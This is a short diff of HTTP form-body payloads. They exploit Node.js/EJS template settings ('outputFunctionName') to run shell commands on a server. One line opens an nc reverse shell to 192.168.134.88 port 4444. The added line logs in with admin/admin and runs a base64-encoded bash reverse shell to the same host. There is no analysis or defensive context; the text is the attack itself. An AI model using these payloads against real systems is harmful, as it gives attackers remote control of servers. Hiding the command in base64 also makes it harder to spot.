@@ -1,1 +1,2 @@
 &settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc 192.168.134.88 4444 -e sh');s
+name=admin&password=admin&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNC44OC80NDQ0IDA+JjE= | base64 -d | bash');s
